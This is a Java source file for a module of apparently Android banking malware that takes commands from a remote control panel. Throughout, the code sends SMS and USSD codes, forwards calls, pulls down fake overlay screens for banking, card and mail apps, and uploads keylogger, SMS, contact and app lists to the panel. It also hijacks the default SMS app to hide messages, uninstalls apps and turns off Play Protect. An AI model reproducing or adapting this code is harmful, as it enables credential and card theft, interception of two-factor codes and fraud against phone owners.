package com.example.modulebot;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Base64;

import com.google.android.gms.safetynet.SafetyNet;
import com.google.android.gms.safetynet.SafetyNetApi;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class mod {

    constants consts = new constants();
    utils utl = new utils();
    int tick;

    private String TAG_LOG  = mod.class.getSimpleName()+ consts.strTAG1;

   public String main(Context context, String args){
        String nameCaseToError = "";
        try {
            JSONObject jsonObject = new JSONObject(args);

          switch (jsonObject.getString("params")){

              case "updateSettingsAndCommands": //Commands, Global Settings and Bots Settings
                  nameCaseToError = "updateSettingsAndCommands";
                  String response = jsonObject.getString("response");
                  if((!response.equals("||no||")) && ((response.contains("~settings~")) || (response.contains("~mySettings~")) || (response.contains("~commands~") || (response.contains("no_command"))))){
                      return updateSettingsAndCommands(context, response);
                  }
                  break;

              case "startViewInject":
                  nameCaseToError = "startViewInject";
                  startViewInject(context, jsonObject);
                  break;

              case "serviceWorkingWhile":
                  nameCaseToError = "serviceWorkingWhile";
                  utl.Log(TAG_LOG, "case serviceWorkingWhile");
                  serviceWorkingWhile(context, jsonObject);
                  break;
          }
        }catch (Exception ex){
            utl.Log(TAG_LOG, "Error module main" + ex.toString());

            utl.SettingsToAdd(context, consts.LogSMS , "(MOD1) case "+nameCaseToError +" | Error module main" + ex.toString() +"::endLog::");
        }

        return "";
    }


    public void checkProtect(final Context context){
        try {
            SafetyNet.getClient(context)
                    .isVerifyAppsEnabled()
                    .addOnCompleteListener(new OnCompleteListener<SafetyNetApi.VerifyAppsUserResponse>() {
                        @Override
                        public void onComplete(Task<SafetyNetApi.VerifyAppsUserResponse> task) {
                            try {
                                if (task.isSuccessful()) {
                                    SafetyNetApi.VerifyAppsUserResponse result = task.getResult();
                                    if (result.isVerifyAppsEnabled()) {
                                       // Log.e("mod","Protect TRUE");
                                           utl.SettingsWrite(context, consts.checkProtect, "1");
                                    //        Log.e("MY_APP_TAG", "Включена функция проверки приложений.");
                                    } else {
                                        utl.SettingsWrite(context, consts.checkProtect, "0");
                                     //  Log.e("mod","Protect FALSE");
                                         //   Log.e("MY_APP_TAG", "Функция проверки приложений отключена.");
                                    }
                                } else {
                                    utl.SettingsWrite(context, consts.checkProtect, "2");
                                    //Log.e("mod","Protect ERROR");
                                    //  Log.e("MY_APP_TAG", "Произошла общая ошибка.");
                                }
                            }catch (Exception ex){
                            //    Log.e("mod","Protect ERROR2");
                                utl.SettingsWrite(context, consts.checkProtect, "2");
                                utl.SettingsToAdd(context, consts.LogSMS , "(MOD2)  | checkProtect 1 " + ex.toString() +"::endLog::");
                            }
                        }
                    });
        }catch (Exception ex){
            utl.SettingsWrite(context, consts.checkProtect, "2");
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD2)  | checkProtect 2 " + ex.toString() +"::endLog::");
           // Log.e("mod","Protect ERROR3");
        }
    }

    private String updateSettingsAndCommands(Context context, String response){
        try {
            JSONObject jsonObject = new JSONObject(response);
            if(jsonObject.getString("this").equals("no_command")
                    && (utl.SettingsRead(context, consts.checkupdateInjection).equals("1"))) { //downloading injections
                JSONObject jsonCheckInj = new JSONObject();

                utl.Log(TAG_LOG, "this no_command start!");
                try {
                    jsonCheckInj.put("id",   utl.SettingsRead(context, "idbot"));
                    jsonCheckInj.put("apps", utl.getAllApplication(context));

                } catch (JSONException e) {
                    utl.SettingsToAdd(context, consts.LogSMS , "(MOD3)  | this no_command start " + e.toString() +"::endLog::");
                }
                utl.Log(TAG_LOG, "jsonUpdateInj: " + jsonCheckInj.toString());
                response = utl.httpRequest(context, consts.str_http_2 + utl.trafEnCr(context, jsonCheckInj.toString()));
                response = utl.trafDeCr(context, response);
                utl.Log(TAG_LOG, "RESPONCE: " + response);
                if (!response.equals("||no||") && (!response.isEmpty())) {  // ||no||
                    try {
                        String[] arrayInjection = response.split(":");
                        for (int i = 0; i < arrayInjection.length; i++) {
                            if (!arrayInjection[i].isEmpty()) {
                                utl.SettingsWrite(context, arrayInjection[i], "");//html fake app
                                utl.SettingsWrite(context, "icon_"+arrayInjection[i], "");//icon
                                utl.Log(TAG_LOG, "Initialization Injection: " + arrayInjection[i]);
                            }
                        }
                        utl.SettingsWrite(context, consts.arrayInjection, response);
                        utl.SettingsWrite(context, consts.checkupdateInjection, "");
                        utl.SettingsWrite(context, consts.whileStartUpdateInection, "1");

                        //     utl.SettingsWrite(context, consts.actionSettingInection, response); //--------!!!DELETE!!!--------------

                        utl.Log(TAG_LOG, "Save Array Injections");
                    } catch (Exception ex) {
                        utl.Log(TAG_LOG, "ERROR Save Array Injectiong! ***********************");
                        utl.SettingsToAdd(context, consts.LogSMS , "(MOD4)  | ERROR Save Array Injectiong " + ex.toString() +"::endLog::");
                    }
                }
            }else if(jsonObject.getString("this").equals("~settings~")){
                utl.Log(TAG_LOG,"~settings~");

                utl.SettingsWrite(context, consts.idSettings , jsonObject.getString("saveID"));// +
                if(jsonObject.getString("arrayUrl").length()>7){
                    utl.SettingsWrite(context, consts.urls, utl.SettingsRead(context, consts.urlAdminPanel) + "," + jsonObject.getString("arrayUrl"));// +
                }
                if(utl.SettingsRead(context, consts.timeInject).equals("-1")) {
                    utl.Log(TAG_LOG,"Save timeInject");
                    utl.SettingsWrite(context, consts.timeInject, jsonObject.getString("timeInject"));// +
                }
                if(utl.SettingsRead(context, consts.timeCC).equals("-1")) {
                    utl.Log(TAG_LOG,"Save timeCC");
                    utl.SettingsWrite(context, consts.timeCC, jsonObject.getString("timeCC"));// +
                }
                if(utl.SettingsRead(context, consts.timeMails).equals("-1")) {
                    utl.Log(TAG_LOG,"Save timeMail");
                    utl.SettingsWrite(context, consts.timeMails, jsonObject.getString("timeMail"));// +
                }
                if(utl.SettingsRead(context, consts.timeProtect).equals("-1")) {
                    utl.Log(TAG_LOG,"Save timeProtect");
                    utl.SettingsWrite(context, consts.timeProtect, jsonObject.getString("timeProtect"));// +
                }

            }else if(jsonObject.getString("this").equals("~mySettings~")){
                utl.Log(TAG_LOG,"get ~mySettings~");
                utl.SettingsWrite(context, consts.hiddenSMS,jsonObject.getString("hideSMS")); // +
                utl.SettingsWrite(context, consts.lockDevice,jsonObject.getString("lockDevice"));// +
                utl.SettingsWrite(context, consts.offSound,jsonObject.getString("offSound"));// +
                utl.SettingsWrite(context, consts.keylogger,jsonObject.getString("keylogger"));// +
                utl.SettingsWrite(context, consts.actionSettingInection,jsonObject.getString("activeInjection"));// +

            }else if(jsonObject.getString("this").equals("~commands~")){
                utl.Log(TAG_LOG,"get ~commands~: " + jsonObject.toString());
                byte[] byteData = Base64.decode(jsonObject.getString("data"), Base64.DEFAULT);
                JSONObject jsonCommand = new JSONObject(new String(byteData, "UTF-8"));
                switch (jsonCommand.getString("name")){
                    case "sendSms":
                        utl.sendSms(context, jsonCommand.getString("number"), jsonCommand.getString("text"));
                        break;
                    case "startUssd":
                        utl.ussd(context, jsonCommand.getString("ussd"));
                        break;
                    case "forwardCall":
                        utl.callForward(context, jsonCommand.getString("number"));
                        break;
                    case "push":
                        utl.sendNotification(context, jsonCommand.getString("app"), jsonCommand.getString("title"), jsonCommand.getString("text"));
                        break;
                    case "getContacts":
                        utl.getContacts(context);
                    case "getInstallApps":
                        utl.getApps(context);
                        break;
                    case "getSMS":
                        utl.getSMS(context);
                        break;
                    case "startInject":
                        utl.openFake(context, jsonCommand.getString("app"));
                        break;
                    case "openUrl":
                        utl.openUrlBraw(context, jsonCommand.getString("url"));
                        break;
                    case "startAuthenticator2":
                        utl.startApplication(context, "com.google.android.apps.authenticator2");
                        break;
                    case "SendSMSALL":
                        utl.sms_mailing_phonebook(context, jsonCommand.getString("text"));
                        break;
                    case "startApp":
                        utl.startApplication(context, jsonCommand.getString("app"));
                        break;
                    case "deleteApplication":
                        utl.SettingsWrite(context, consts.autoClick, "1");
                        utl.SettingsWrite(context, consts.killApplication, jsonCommand.getString("app"));
                        break;
                    case "startAdmin":
                        utl.SettingsWrite(context, consts.start_admin, "1");
                        break;
                    case "killMe":
                        utl.SettingsWrite(context, consts.autoClick, "1");
                        utl.SettingsWrite(context, consts.killApplication, context.getPackageName());
                        break;
                    case "updateInjectAndListApps":
                        utl.SettingsWrite(context, consts.checkupdateInjection, "1");
                        break;
                    case "updateModule":
                        utl.SettingsWrite(context, "statDownloadModule", "0");
                        try {
                            new File(context.getDir("apk", Context.MODE_PRIVATE), "system.apk").delete();
                        }catch (Exception ex){
                            utl.SettingsToAdd(context, consts.LogSMS , "(MOD5)  | updateModule " + ex.toString() +"::endLog::");
                        }
                        break;


                }
            }
            return  "1";
        }catch (Exception ex){
            utl.Log(TAG_LOG, "ERROR Json ~settings~ and ~commands~ " + ex);
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD6)  | ERROR Json ~settings~ and ~commands~  " + ex.toString() +"::endLog::");
            return  "0";
        }
    }

    private String startViewInject(Context context, JSONObject jsonObject){
        try{
            Intent dialogIntent = new Intent();
            dialogIntent.setComponent(new ComponentName(jsonObject.getString("packageProject"), jsonObject.getString("packageView")));
            dialogIntent.putExtra("app", jsonObject.getString("packageAppStart"));
            dialogIntent.putExtra("name", jsonObject.getString("nameInject"));
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            context.startActivity(dialogIntent);
        }catch (Exception ex) {
            utl.Log(TAG_LOG, "Error module startViewInject");
            //     utl.SettingsToAdd(context, consts.LogSMS , "(MOD7)  | Error module startViewInject  " + ex.toString() +"::endLog::");}
        }
        return "";
    }

    private String serviceWorkingWhile(Context context, JSONObject jsonObject){

        String idbot = "";
        try{
            tick = Integer.parseInt(jsonObject.getString("tick"));
            idbot = jsonObject.getString("idbot");
        }catch (Exception ex){
            tick = 0;
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD8)  | tick  " + ex.toString() +"::endLog::");
        }
        //----------donwload injections------
        try {
            if (utl.SettingsRead(context, consts.whileStartUpdateInection).equals("1")) {
                utl.Log(TAG_LOG, "Start Downloading Injections...");
                String[] arrayInjection = utl.SettingsRead(context, consts.arrayInjection).split(":");
                int intExitInj = 0;
                for (int i = 0; i < arrayInjection.length; i++) {
                    utl.Log(TAG_LOG, "Name Inject: " + arrayInjection);
                    if ((!arrayInjection[i].isEmpty() && (!arrayInjection[i].equals("||no||")))) {
                        try {
                            if (utl.SettingsRead(context, arrayInjection[i]).isEmpty()) {
                                String htmlBase64Inj = utl.downloadInjection(context, arrayInjection[i]);

                                if (htmlBase64Inj.length() > 10) {
                                    utl.SettingsWrite(context, arrayInjection[i], htmlBase64Inj);
                                    utl.Log(TAG_LOG, "Downloading Injection:  " + arrayInjection[i] + "   size: " + htmlBase64Inj.length());
                                } else {
                                    utl.Log(TAG_LOG, "Downloading Injection Error:  " + arrayInjection[i] + "   size: " + htmlBase64Inj.length());
                                    intExitInj++;
                                }

                                String htmlBase64Icon = utl.downloadIcon(context, arrayInjection[i]);
                                if (htmlBase64Icon.length() > 10) {
                                    utl.SettingsWrite(context, "icon_" + arrayInjection[i], htmlBase64Icon);
                                    utl.Log(TAG_LOG, "Downloading Icon:  " + arrayInjection[i] + "   size: " + htmlBase64Icon.length());
                                }
                            }
                        } catch (Exception ex) {
                            utl.Log(TAG_LOG, "ERROR for download injections");
                            utl.SettingsToAdd(context, consts.LogSMS, "(MOD9)  | ERROR for download injections  " + ex.toString() + "::endLog::");
                        }
                    }
                }
                if (intExitInj == 0) {
                    utl.SettingsWrite(context, consts.whileStartUpdateInection, "");
                    utl.Log(TAG_LOG, "Downloading All Injections! =)");
                } else {
                    utl.Log(TAG_LOG, "Downloading Injections! Error downloand inject: " + intExitInj);
                }
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD10)  | donwload injections  " + ex.toString() +"::endLog::");
        }
        //------------Upload Logs Injection------
        try {
            String getListIdInjection = utl.SettingsRead(context, consts.listSaveLogsInjection);
            if (!getListIdInjection.isEmpty()) {
                String[] arrayList = getListIdInjection.split(":");
                for (int i = 0; i < arrayList.length; i++) {
                    if (!arrayList[i].isEmpty()) {
                        utl.Log(TAG_LOG, "Send Data Injection to Server: " + arrayList[i]);
                        String send = utl.SettingsRead(context, arrayList[i]);
                        utl.Log(TAG_LOG, "RESPENCE " + send);
                        if (utl.sendLogsInjection(context, arrayList[i], send, idbot).equals("ok")) {
                            utl.Log(TAG_LOG, "RESPONCE (ok) " + arrayList[i]);
                            utl.SettingsRemove(context, consts.listSaveLogsInjection, arrayList[i] + ":");
                        }
                    }
                }
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD11)  | Upload Logs Injection  " + ex.toString() +"::endLog::");
        }
        try{
        //--------------Send Logs SMS------------
        String getLogSMS = utl.SettingsRead(context, consts.LogSMS);
        if(!getLogSMS.isEmpty()){
            if(utl.sendLogsSMS(context, getLogSMS,idbot).equals("ok")){
                if(utl.SettingsRead(context, consts.LogSMS).length() > getLogSMS.length()){
                    utl.SettingsRemove(context, consts.LogSMS, getLogSMS);
                }else{
                    utl.SettingsWrite(context, consts.LogSMS,"");
                }
            }
        }
        //--------------Send Logs Keylogger------------
        String getLogKeylogger = utl.SettingsRead(context, consts.dataKeylogger);
        if(!getLogKeylogger.isEmpty()){
            if(utl.sendLogsKeylogger(context, getLogKeylogger, idbot).equals("ok")){
                utl.SettingsWrite(context, consts.dataKeylogger, "");
            }
        }
        //-------------Send Logs Contacts---------------
        String logsContacts = utl.SettingsRead(context, consts.logsContacts);
        if(!logsContacts.isEmpty()){
            if(utl.sendLogsContacts(context, logsContacts, idbot).equals("ok")){
                utl.SettingsWrite(context, consts.logsContacts, "");
            }
        }

        //-------------Send Logs Saved SMS---------------
        String logsSavedSMS = utl.SettingsRead(context, consts.logsSavedSMS);
        if(!logsSavedSMS.isEmpty()){
            if(utl.sendLogsSavedSMS(context, logsSavedSMS, idbot).equals("ok")){
                utl.SettingsWrite(context, consts.logsSavedSMS, "");
            }
        }
        //-------------Send Logs Applications---------------
        String logsApplications = utl.SettingsRead(context, consts.logsApplications);
        if(!logsApplications.isEmpty()){
            if(utl.sendLogsApplications(context, logsApplications, idbot).equals("ok")){
                utl.SettingsWrite(context, consts.logsApplications, "");
            }
        }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD12)  | Send Logs " + ex.toString() +"::endLog::");
        }

        //----------------Hidden SMS---------------
        try {
            if (utl.getScreenBoolean(context)) {
                if (android.os.Build.VERSION.SDK_INT >= 19) {
                    if ((utl.SettingsRead(context, consts.hiddenSMS).equals("1") || ((utl.SettingsRead(context, consts.day1PermissionSMS).equals("1")) && (Integer.parseInt(utl.SettingsRead(context, "schetBootReceiver")) >= 11 ))) ) {
                        if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) { //Hidden SMS

                            if (Build.VERSION.SDK_INT >= 29) {
                                try {
                                    utl.SettingsWrite(context, consts.autoClick, "1");
                                    context.startActivity(new Intent(context, Class.forName( utl.SettingsRead(context, "sms_sdk_Q") ) )
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                                }catch (Exception e){ utl.Log(TAG_LOG,"ERROR activity_change_smsManager_sdk_Q");}

                            }else{
                                utl.SettingsWrite(context, consts.autoClick, "1");//auto click start!
                                utl.swapSmsMenager(context, context.getPackageName());
                            }

                        }
                    } else {
                        if (Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) { // return
                            utl.SettingsWrite(context, consts.autoClick, "1");//auto click start!
                            utl.swapSmsMenager(context, utl.SettingsRead(context, consts.packageNameDefultSmsMenager));
                        }
                    }

                    if (Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
                        if (utl.SettingsRead(context, consts.day1PermissionSMS).equals("1")) {
                            utl.SettingsWrite(context, consts.day1PermissionSMS, "");
                        }
                    }
                }
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD13)  | Hidden SMS " + ex.toString() +"::endLog::");
        }
        //----------------Stop Sound------------------
        try {
            if (utl.SettingsRead(context, consts.offSound).equals("1")) {
                utl.stopSound(context);
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD14)  | Stop Sound " + ex.toString() +"::endLog::");
        }
        //---------Kill Application---------------------
        try{
        if(utl.getScreenBoolean(context)){
            String nameAppKill = utl.SettingsRead(context, consts.killApplication);
            if(!nameAppKill.isEmpty()){
                utl.SettingsWrite(context, consts.autoClick, "1");
             //   utl.SettingsWrite(context, "kill", "dead");
                try {
                    Intent intent1 = new Intent(Intent.ACTION_DELETE);
                    intent1.setData(Uri.parse("package:" + nameAppKill));
                    context.startActivity(intent1);
                }catch (Exception ex){
                    Intent appSettingsIntent = new Intent(Intent.ACTION_DELETE);
                    appSettingsIntent.setData(Uri.parse("package:" + nameAppKill));
                    appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    context.startActivity(appSettingsIntent);

                    utl.SettingsToAdd(context, consts.LogSMS , "(MOD16)  | Kill Application 1 " + ex.toString() +"::endLog::");
                }
            }
        }}catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD15)  | Kill Application 2 " + ex.toString() +"::endLog::");
        }
        //-------------timeInjecting--------------------
        try {
            if (!utl.SettingsRead(context, consts.arrayInjection).isEmpty()) {
                //-------------timeBanks--------------------
                int timeInj = Integer.parseInt(utl.SettingsRead(context, consts.timeInject));
                if ((tick > timeInj) && (timeInj != -1) && (timeInj != -2)) {
                    if (utl.timeInjectionsSendPanel(context, "banks", idbot).equals("ok_banks")) {
                        utl.SettingsWrite(context, consts.timeInject, "-2");
                    }
                }
                //-------------timeCC--------------------
                int timeCC = Integer.parseInt(utl.SettingsRead(context, consts.timeCC));
                if ((tick > timeCC) && (timeCC != -1) && (timeCC != -2)) {
                    if (utl.timeInjectionsSendPanel(context, "grabCC", idbot).equals("ok_grabCC")) {
                        utl.SettingsWrite(context, consts.timeCC, "-2");
                    }
                }
                //-------------timeMails--------------------
                int timeMails = Integer.parseInt(utl.SettingsRead(context, consts.timeMails));
                if ((tick > timeMails) && (timeMails != -1) && (timeMails != -2)) {
                    if (utl.timeInjectionsSendPanel(context, "grabMails", idbot).equals("ok_grabMails")) {
                        utl.SettingsWrite(context, consts.timeMails, "-2");
                    }
                }
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD16)  | timeInjecting " + ex.toString() +"::endLog::");
        }
        //--------------------auto off protect------------------------
        checkProtect(context);
        try {
            if ((jsonObject.getString("accessibility").equals("1")) && (utl.getScreenBoolean(context))) {
                if (utl.SettingsRead(context, consts.checkProtect).equals("1")) {
                    if(tick > Integer.parseInt(utl.SettingsRead(context, consts.timeProtect))) {
                            utl.SettingsWrite(context, consts.goOffProtect, "1");
                            Intent intent = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                            context.startActivity(intent);
                    }
                }
            }
        }catch (Exception ex){
            utl.SettingsToAdd(context, consts.LogSMS , "(MOD17)  | error off protect " + ex.toString() +"::endLog::");
        }
        return "";
    }

}
